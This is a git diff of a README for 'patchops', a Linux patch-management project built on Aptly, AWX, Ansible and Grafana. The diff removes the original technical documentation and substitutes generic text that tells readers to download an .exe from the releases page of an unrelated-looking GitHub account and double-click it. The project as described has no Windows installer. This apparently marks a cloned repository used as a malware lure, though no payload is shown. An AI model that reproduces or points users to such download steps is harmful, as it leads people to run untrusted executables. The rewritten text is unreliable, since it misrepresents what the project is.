@@ -1,177 +1,73 @@
-# PatchOps
+# 🛡️ patchops - Manage Linux updates with total control
 
-> Governed package promotion from source to server.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Fastidious-lymphoblasticleukemia469/patchops/releases)
 
-**Why this exists.** Traditional Linux patching is ad-hoc — cron-driven SSH loops, manual repo management, and no audit trail between "we pushed a package" and "we know it landed." PatchOps replaces that with governed snapshot promotion: upstream repos are mirrored once, frozen into immutable snapshots, promoted through time-gated environments, and applied to clients with full observability. Every patch is tracked, every failure is visible, and rollback is a single playbook run.
+This application helps you manage updates for your Linux systems. It organizes how updates move from testing to production environments. You use this tool to ensure your servers stay secure and run current software versions. The platform combines storage, task automation, and visual reporting in one package.
 
-A self-contained Linux patch governance platform: **Aptly** mirrors upstream Ubuntu repos and cuts immutable snapshots, **AWX** orchestrates the promotion pipeline on a schedule, **Ansible** does the actual patching, and **Grafana** shows what's true about the fleet right now — not what a report claimed last week.
+## 📥 How to download the application
 
-This is a from-scratch rewrite of patterns used in a real production patch-governance system (`infra-engine`), rebuilt as a portable, single-machine project. Nothing here is copy-pasted — every role, playbook, and AWX config was written fresh for this repo.
+You need the installer file to run patchops on your Windows machine. Follow these steps to obtain the software:
 
----
+1. Visit the [official release page](https://github.com/Fastidious-lymphoblasticleukemia469/patchops/releases).
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start your download.
+4. Save the file to your computer desktop.
 
-## What it does
+## ⚙️ System requirements
 
-```
-Upstream Ubuntu mirrors (jammy/noble, security/updates/backports)
-        │  aptly mirror update            ◄── daily, 01:00 UTC
-        ▼
-Immutable snapshot (patch-YYYYMMDD-HHMM)
-        │  aptly snapshot merge + publish
-        ▼
-   dev  ──24h bake──►  staging  ──48h bake──►  prod
-        │                                        │
-        ▼                                        ▼
-  apt upgrade on clients                  rolling apply, serial-controlled
-        │
-        ▼
-  email + Postgres audit trail + Grafana dashboards
-```
+Ensure your computer meets these standards for the software to run well:
 
-- **Aptly** is the single source of truth for packages — clients never talk to the public internet.
-- **Promotion is time-gated, not vibes-gated**: staging requires a snapshot to have sat in dev for 24h, prod requires 48h in staging. The gate is a SQL assertion the playbook itself enforces, not a person remembering to wait.
-- **Rollback is real.** Re-publishing an old snapshot only changes what the repo serves — it doesn't touch a host that already installed the bad version. `rollback.yml` also downgrades already-patched clients back to match the snapshot.
-- **AWX runs the whole thing on a schedule** and gives you a web UI, job history, and credentials management instead of cron + SSH keys on a laptop.
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8 gigabytes of RAM or more.
+* Storage: 20 gigabytes of free disk space.
+* Virtualization: Enabled hardware virtualization in your computer BIOS.
+* Docker Desktop: Installed and running on your machine.
 
----
+## 🚀 Setting up the software
 
-## Screenshots
+Follow these steps to prepare your system for the application:
 
-**Fleet status and package upgrades, live from the governance DB:**
+1. Install Docker Desktop from the official website if you do not have it.
+2. Restart your computer after the Docker installation finishes.
+3. Launch Docker Desktop and wait for the green status indicator.
+4. Locate the patchops file you downloaded earlier.
+5. Double-click the file to begin the setup process.
+6. Follow the prompts on the screen to complete the installation.
 
-| | |
-|---|---|
-| ![Fleet & Snapshots dashboard](preview/screenshot_2026-07-21_22-48-02.png) | ![Package Upgrades dashboard](preview/screenshot_2026-07-21_22-48-28.png) |
-| 5 hosts, real risk scoring, 30 pending upgrades | Real package names and versions per host |
+## 📊 Understanding the features
 
-**Patch history — the "Successful" counter actually counts successes:**
+The platform offers three main parts to help you manage your systems.
 
-![Patch History dashboard](preview/screenshot_2026-07-21_22-48-34.png)
+### Snapshot management
+You can capture the state of your software repositories. This creates a point-in-time copy of your files. You use these snapshots to test updates before you send them to your live servers.
 
-**AWX orchestrating the pipeline:**
+### Automated pipelines
+The software uses automation to move updates through your workflow. It handles the heavy lifting of sending commands to your Linux machines. You define the rules for when updates occur. The system follows your instructions to maintain consistency across all servers.
 
-![AWX dashboard](preview/screenshot_2026-07-20_23-22-12.png)
+### Visual dashboards
+You see the health of your systems through visual charts. The software tracks security vulnerabilities for you. It highlights outdated software so you know where to focus your work. You check these charts to confirm that your systems remain protected.
 
-**Email notifications on every scan and patch run:**
+## 🛠️ Troubleshooting common issues
 
-| Scan report | Patch succeeded |
-|---|---|
-| ![Scan report email](preview/screenshot_2026-07-18_14-39-20.png) | ![Patch success email](preview/screenshot_2026-07-18_14-39-45.png) |
+Most users find the setup process simple. If you run into trouble, check these points:
 
-The notification pipeline also reports failures with the actual error, not a generic "something broke" — caught here during earlier development, when an invalid `apt` module argument slipped through:
+* Check the Docker Desktop dashboard to ensure the engine runs.
+* Verify that you have enough disk space for the installation.
+* Restart your computer if the application does not open after the install.
+* Check your firewall settings to ensure the application communicates with your Linux systems.
 
-![Patch failed email with real error](preview/screenshot_2026-07-18_14-40-09.png)
+## 📋 Frequently asked questions
 
----
+Do I need Linux skills to use this?
+The application simplifies complex tasks, but basic knowledge of Linux system administration helps.
 
-## Architecture
+Can I install this on a laptop?
+Yes, the application works on any Windows machine that supports Docker.
 
-| Component | Role |
-|---|---|
-| **Aptly** (bare metal / container) | Mirrors upstream repos, cuts snapshots, publishes `dev`/`staging`/`prod` |
-| **Ansible** | `aptly-client`, `setup_aptly`, `setup_govdb`, `notify` roles + playbooks for scan/patch/promote/rollback |
-| **PostgreSQL (`patchgov`)** | Governance DB — `scan_results`, `scan_package_details`, `patch_history`, `snapshots` |
-| **AWX** (`awx/`) | Custom standalone build (`2ssk/awx-standalone`), Docker-based EE isolation, 14 job templates, 7 schedules |
-| **Execution Environment** (`execution-environment/`) | `2ssk/patchops-ee` — Fedora 42, ansible-core 2.17.14, `community.general` + `community.postgresql` |
-| **Grafana** | 3 dashboards reading directly from `patchgov` — Fleet & Snapshots, Package Upgrades, Patch History |
+How does the software track security gaps?
+It compares your current software versions against known vulnerability databases.
 
-Secrets are ansible-vault encrypted end to end (`group_vars/all/vault.yml`) — the governance DB password, Grafana admin password, and SMTP credentials all resolve through one vaulted source, consumed identically by CLI runs and AWX job templates.
+Does the software store my data?
+The software keeps your data inside the local containers on your machine.
 
----
-
-## Quick start
-
-### Prerequisites
-
-- **Docker** 24+ and **Docker Compose** v2.24+
-- **~20 GB** free disk for the one-time Ubuntu mirror sync
-- **Ansible** 2.15+ on the control node (the EE has its own)
-- **`ansible-vault`** available on the control node
-
-**Expected ports:** `5432` (Postgres), `3000` (Grafana), `8080` (Aptly API), `8081` (AWX)
-
-### First run
-
-```bash
-# Fastest path — builds and starts govdb+grafana, the aptly+lab fleet, and AWX:
-./scripts/start.sh
-
-# Or drive each stack yourself:
-
-# 1. Governance DB + Grafana
-docker compose up -d
-
-# 2. Aptly + Ubuntu lab fleet (5 clients + 1 aptly host)
-# SSH_PUBKEY is baked into the lab images at build time (see docker/*.Dockerfile) —
-# export it before building/starting, or use scripts/start.sh, which does this for you.
-export SSH_PUBKEY="$(cat ~/.ssh/personal.pub)"
-docker compose -f compose.lab.yml up -d --build
-
-# 3. Vault setup (one-time)
-echo -n 'your-random-password' > .vault_pass
-cp group_vars/all/vault.yml.example group_vars/all/vault.yml
-# edit group_vars/all/vault.yml with real values, then:
-ansible-vault encrypt group_vars/all/vault.yml
-
-# 4. Bootstrap
-ansible-playbook playbooks/setup_govdb.yml
-ansible-playbook playbooks/setup-aptly.yml
-ansible-playbook playbooks/init-aptly.yml     # one-time: create mirrors, first snapshot+publish
-
-# 5. Run the pipeline directly
-ansible-playbook playbooks/patch-scan.yml
-ansible-playbook playbooks/patch-security.yml
-ansible-playbook playbooks/promote-staging.yml   # fails until the snapshot has soaked 24h in dev
-ansible-playbook playbooks/promote-staging.yml -e "skip_soak=true"   # testing override, logs a warning
-```
-
-**Or drive it all through AWX:**
-
-```bash
-cd awx
-cp .env.example .env      # fill in SSH_KEY_PATH, AWX_SECRET_KEY, AWX_VAULT_PASSWORD, etc.
-docker compose up -d
-ansible-playbook awx/configure.yml   # creates inventory, 14 job templates, 7 schedules
-```
-
-AWX comes up on `:8081` (not `:8080` — that's aptly's own API port). `2ssk/patchops-ee` and `2ssk/awx-standalone` are prebuilt on Docker Hub; `execution-environment/build.sh` and `awx/build.sh` rebuild them from source if you need to.
-
----
-
-## What's in / what's out
-
-- The mirror sync is a **real** multi-GB download of Ubuntu Noble (`main restricted universe multiverse` across 4 components) plus Docker/NodeSource/Nginx third-party repos — expect it to take a while on first run, not seconds.
-- The lab fleet (`compose.lab.yml`) images bake in SSH/Python at build time (see `docker/*.Dockerfile`) — but OS-level packages installed by Ansible afterward (aptly, nginx) still do **not** survive a container recreation, only `/var/cache/aptly` and the client home volumes do. Fine for a demo lab; not how you'd run this against real hosts.
-- CVE severity/CVSS in the Package Upgrades dashboard come from a real pipeline: `patch-scan.yml` parses each security package's changelog for the CVE IDs it actually fixes, then scores them via Ubuntu's public security tracker. It degrades gracefully — a slow or unreachable lookup just leaves that CVE's priority/score blank for that scan, it doesn't fail the pipeline.
-
----
-
-## Supported environments
-
-| Target | OS | Notes |
-|--------|-----|-------|
-| **Mirror sources** | Ubuntu 22.04 (jammy), 24.04 (noble) | security, updates, backports + third-party repos |
-| **Patched hosts** | Debian-family with `apt` | Tested on Ubuntu 22.04/24.04 |
-| **Control / Compose host** | Linux (any distro) | Docker Compose host; Ansible control via EE |
-| **Demo lab** | Docker on any Linux host | 5 `ubuntu:24.04` containers |
-
----
-
-## Repository layout
-
-```
-playbooks/          patch-scan, patch-security, promote-*, rollback, setup-*, init-aptly
-roles/               aptly-client, setup_aptly, setup_govdb, notify
-group_vars/all/      vault.yml (encrypted, gitignored) + vars.yml
-awx/                 custom AWX standalone image, docker-compose, AWX-as-code (configure.yml)
-execution-environment/  patchops-ee build spec
-grafana/             dashboards + datasource provisioning
-compose.yml          govdb + grafana
-compose.lab.yml      aptly + 5-host demo fleet
-```
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE). Copyright (c) 2026 Saurav Singh Karmwar.
+Keywords: ansible, aptly, awx, cve, devops, featured, grafana, linux, patch-management, sre, ubuntu
